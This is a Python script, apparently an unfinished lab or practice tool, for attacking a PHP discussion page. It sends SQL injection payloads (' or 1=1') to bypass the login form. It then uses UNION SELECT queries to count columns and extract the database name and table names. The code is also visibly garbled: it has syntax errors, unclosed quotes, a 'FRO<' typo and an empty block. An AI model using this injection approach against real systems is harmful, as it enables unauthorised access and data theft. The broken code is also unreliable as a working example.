import requests
from getopt import getopt
import sys
from bs4 import BeautifulSoup
#python name.py -t http://localhost:8080 -u /discussion.php?discussion_id=1

session = requests.session()
TARGET = ""
URI = ""
DATABASE = False
TABLE = False
COLUMN = False
DATA = False
DUMP = False
COLUMN_COUNT = 0
DATABASE_NAME = ""
TABLES = []

def get_column_count():
    global COLUMN_COUNT
    full_url = TARGET +URI + " UNION SELECT "
    full_url +=i
    for i in range(1,10):
        if i != 1:
            full_url = ", "
        full_url += str(i)
        print(full_url)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        container = soup.find("div", attrs={"class" : "container content"})
        if(container.text.strip()!= ""):
            COLUMN_COUNT = i
            break
    print("Total column count:", COLUMN_COUNT)

def attack():
    global DATABASE_NAME, global TABLES
    if DATABASE or DUMP:
        full_url = TARGET + URI + " UNION SELECT 1"
        for i in range(2,COLUMN_COUNT+1):
            full_url += ",CONCAT('<data>', DATABASE(), '</data>"
        full_url += " LIMIT 1 OFFSET 1"   
        print( full_url)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        print("Database Name: ",soup.find("data").decode_contents())
        DATABASE_NAME = soup.find("data").decode_contents()
        if TABLE or DUMP:
            full_url = TARGET + URI + " UNION SELECT 1"
            for i in range(2,COLUMN_COUNT+1):
            full_url += ",CONCAT('<data>', GROUP_CONCAT(TABLE_NAME), '</data>"
            full_url += " FRO< INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '%' LIMIT 1 OFFSET 1" %(DATABASE_NAME)  
            print( full_url)
            resp = session.get(full_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            TABLES = soup.find("data").decode_contents().split(",")
            print ("Tables: ",TABLES)

        if COLUMN or DUMP:



opts, _ = getopt(sys.argv[1:], "t:u:", ["target", "uri","database","table","column","data","dump"])

for key,value in opts:
    if key in ["-t", "--tarrget"]:
        TARGET = value
    elif key in ["-u", "--uri"]:
        URI = value
    elif key == "--database":
        DATABASE = True
    elif key == "--table":
        TABLE = True
    elif key == "--column":
        COLUMN = True
    elif key == "--data":
        DATA = True
    elif key == "--dump":
        DUMP = True
    
resp = session.get(TARGET + URI)

print(resp.status_code)
print(resp.url)

if(resp.url != (TARGET + URI)):
    soup = BeautifulSoup(resp.text,"html.parser")
    login_form = soup.find("form")
    print(login_form["action"], login_form["method"])
    resp = session.request(login_form["method"], TARGET + "/" + login_form["action"], data={
        "csrf_token" : login_form.find("input", attrs={"name":"csrf_token"})["value"],
        "action" : login_form.find("input", attrs={"name":"action"})["value"],
        "username" : "' or 1=1 LIMIT 1 #'",
        "password": "' or 1=1 LIMIT 1'",
    }) 
    print(resp.url)
    resp = session.get(TARGET + URI)
    if (TARGET + URI) == resp.url:
        print("login success")
        get_column_count()
        attack()
    else:
        print("Failder")
